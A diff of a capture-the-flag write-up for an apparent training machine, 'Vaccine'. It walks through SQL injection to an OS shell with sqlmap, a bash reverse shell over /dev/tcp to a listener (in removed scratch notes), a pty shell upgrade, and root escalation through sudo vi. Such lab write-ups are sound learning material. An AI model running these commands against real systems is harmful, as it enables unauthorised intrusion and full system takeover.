@@ -605,10 +605,10 @@ Looking at the `sqlmap` options, the `--os-shell` looks pretty good.
 **Task 7**  
 What program can the postgres user run as root using sudo?  
 
-First, let's gain access to the machine. 
+First, let's gain access to the machine. (n.b. extending the timeout prevented me from getting kicked off every couple of minutes)
 
 ```bash
-kali$ sqlmap --os-shell -u http://$TARGET/dashboard.php?search=abc --cookie=PHPSESSID=<session id>
+kali$ sqlmap --os-shell -u http://$TARGET/dashboard.php?search=abc --cookie=PHPSESSID=<session id> --timeout 1800
 ...
 it looks like the back-end DMBS is 'PostgreSQL'
 ...
@@ -636,7 +636,14 @@ kali$ nc -lvnp 1337
 postgres@vaccine:/var/lib/postgresql/11/main$
 ```
 
-At this point, I was having some issues with the question. When trying to find permissions by `sudo -l`, I was getting hit with "sudo: a terminal is required to read the password". At this point, I returned to the writeup which showed that while this bash reverse shell was more stable, it wasn't enough - we needed a stable shell.
+My initial idea was to look for files that had the SETUID bit. That could perhaps give an idea for a program we could abuse for privesc. Unfortunately that only yielded the standard files in /usr/bin and /usr/share, as well as a bunch of snap packages. This didn't seem to be the right approach:
+
+```bash
+# Failed attempt to find permissions
+find /usr 2>/dev/null -type f -perm /4000
+```
+
+I referred to a hint which pointed me in the direction of `sudo -l`. When trying to find permissions by `sudo -l`, I was getting hit with the error `sudo: a terminal is required to read the password`. At this point, I returned to the writeup which showed that while this bash reverse shell was more stable, it wasn't enough - we needed a stable shell. See docs for [`pty.spawn()`](https://docs.python.org/3/library/pty.html#pty.spawn)
 
 ```
 postgres@vaccine:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -687,7 +694,7 @@ ec9b13ca4d6229cd5cc1e09980965bf7
 **Task 9**  
 Submit root flag  
 
-In vi, we can get a shell by `:sh`. Doing so after opening the file with sudo gives us a root shell
+In vi, we can get a shell by `:sh`. Doing so after opening the file with sudo gives us a root shell. 
 
 ```bash
 postgres@vaccine$ sudo vi /etc/postgresql/11/main/pg_hba.conf
@@ -707,18 +714,4 @@ cat root.txt
 dd6e058e814260bc70e9bbdef2715849
 ```
 
-
-
-Todo: Write up about failed `find` attempt
-
-find /usr 2>/dev/null -type f -perm /4000 - failed attempt to find permissions
-
-
-sqlmap --os-shell -u http://$TARGET/dashboard.php?search=abc --cookie=PHPSESSID=v6bd1717a43omas1b6r01rvgbg --timeout 1800
-/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/5009 0>&1'
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-sudo vi /etc/postgresql/11/main/pg_hba.conf
-
-
-Todo: write up about the use of sudo with the SUID. I wouldn't have got that without the writeup
-https://gtfobins.github.io/gtfobins/vi/#sudo
+Look at that! Root flag obtained. What I didn't know earlier, and perhaps was due to not reading the full output before, was that in order for the command to be executed as root, I would need to use `sudo` on that specific command. I had assumed that simply using `vi` would automatically default to root. When that didn't work, I assumed that using `vi` to open the file would automatically escalate me to root. Turns out, I need to specify sudo. Sudo would then perform a lookup to validate permissions. Also worth noting is the gtfobins page on vi here: https://gtfobins.github.io/gtfobins/vi/#sudo
